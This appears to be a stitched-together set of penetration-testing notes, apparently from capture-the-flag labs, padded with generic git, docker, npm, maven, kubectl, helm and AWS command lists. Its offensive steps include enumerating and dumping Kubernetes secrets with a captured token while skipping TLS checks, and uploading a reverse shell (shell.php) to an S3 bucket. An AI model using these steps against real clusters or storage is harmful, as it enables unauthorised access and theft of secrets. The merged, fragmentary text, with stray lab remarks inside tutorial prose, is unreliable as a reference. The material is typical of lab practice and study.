k0s kubectl get secretWhen using the K0s Kubernetes distribution, you can use the kubectl command-line tool to interact with the Kubernetes cluster. To retrieve information about secrets in the cluster, including their names and metadata, you can use the following commands:

k0s kubectl get secret :secret that we’ve hidden from ourselves, so let’s check the secrets in here:
k0s kubectl edit secret xxsecretxxnamexx : get specific info on a secret name
k0s kubectl get pods --help : showed that you can list all pods across all namespaces with the -A flag, which gives us a list of the pods:
k0s kubectl get pods -A   :list all pods across all namespaces with the -A flag, which gives us a list of the pods:
k0s kubectl exec -it xxpodxxnamexx --namespace=kube-system -- /bin/bash  : can execute specific pods with exec -it
k0s kubectl get job -n xxpodnamexxx : info about a specific pod
k0s kubectl get job -n internship -o json : output the info in json format


once we have the token id we can enumerate with following command
-----------------------------------------------------------------

kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 auth can-i --list  
kubectl --token=`cat token` --namespace=default --server=https://10.10.228.155:8443 get pods        
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 get secrets                   
kubectl --token=`cat token` --insecure-skip-tls-verify --namespace=default --server=https://10.10.228.155:8443 get secrets flag -o yaml

==============================================git_enumeration======================================================================
check git logs in a system terminal
-------------------------------------

git log --pretty=oneline  :check git commits in after cd into .git folder
git show xxxxcommitxxidxxxxx : what is commited checking through commit number or id
==========================================================aws_S3_enum==============================================================
aws configure : configure with credentials
aws --endpoint=http://s3.thetoppers.htb s3 ls : list all the buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb :enumerate with specific bucket
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb : copy a reverse shell in a remote bucket



=================================================================================================================================

This command will list all the secrets available in the current Kubernetes context. By default, it will display the name, type, and age (creation timestamp) of each secret.

If you have multiple Kubernetes contexts configured, you can specify the context explicitly by using the --context flag:


kubectl --context <context-name> get secret

Replace <context-name> with the name of the specific context you want to use.

If you would like to retrieve more detailed information about a specific secret, you can use the describe command:



kubectl describe secret <secret-name>

Replace <secret-name> with the name of the secret you want to retrieve detailed information about. This command will display additional details such as the data stored within the secret.

Remember to ensure you have the appropriate permissions and access rights to retrieve secrets in the cluster.

==================================================================================================

git clone <repository-url>: Clones a Git repository to your local machine.
git checkout <branch-name>: Switches to a specific branch in a Git repository.
git pull: Updates your local repository with the latest changes from the remote repository.
git add <file(s)>: Stages changes for commit in Git.
git commit -m "<commit-message>": Commits the staged changes with a descriptive message.
git push: Pushes committed changes to the remote repository.
git branch: Lists local branches and shows the current branch.
git merge <branch-name>: Merges changes from the specified branch into the current branch.
git tag <tag-name>: Creates a new tag at the current commit.
git log: Displays the commit history of a Git repository.
docker build -t <image-name> .: Builds a Docker image from the Dockerfile in the current directory.
docker run <image-name>: Runs a Docker container based on the specified image.
docker push <image-name>: Pushes a Docker image to a container registry.
docker pull <image-name>: Pulls a Docker image from a container registry.
docker-compose up: Starts services defined in a Docker Compose file.
docker-compose down: Stops and removes containers defined in a Docker Compose file.
npm install: Installs dependencies specified in the package.json file.
npm run <script-name>: Executes a script defined in the package.json file.
npm test: Runs tests defined in the project.
npm publish: Publishes a package to a package registry (e.g., npm registry).
mvn clean install: Cleans the project, compiles source code, and installs dependencies using Maven.
mvn test: Executes unit tests for a Maven project.
mvn package: Packages the application into a distributable format (e.g., JAR, WAR).
mvn deploy: Deploys the project artifacts to a remote repository.
gradle build: Builds a Gradle project.
gradle test: Executes tests for a Gradle project.
gradle publish: Publishes artifacts to a remote repository.
kubectl apply -f <yaml-file>: Applies Kubernetes configuration defined in a YAML file.
kubectl get pods: Lists running Pods in a Kubernetes cluster.
kubectl describe pod <pod-name>: Provides detailed information about a specific Pod.
kubectl scale deployment <deployment-name> --replicas=<num-replicas>: Scales the number of replicas for a Kubernetes Deployment.
kubectl rollout restart deployment <deployment-name>: Restarts a Kubernetes Deployment, triggering a new rollout.
helm install <chart>: Installs a Helm chart onto a Kubernetes cluster.
helm upgrade <release-name> <chart>: Upgrades a Helm release using a new chart version.
helm rollback <release-name> <revision>: Rolls back a Helm release to a previous revision.
aws configure: Configures AWS CLI credentials and settings.
aws s3 cp <source> <destination>: Copies files between your local machine and an S3 bucket.
aws lambda create-function: Creates a new AWS Lambda function.
aws lambda update-function-code: Updates the code for an existing AWS Lambda function.
aws ecs create-service: Creates an Amazon ECS service.
aws ecs update-service: Updates an Amazon ECS service with new task definitions.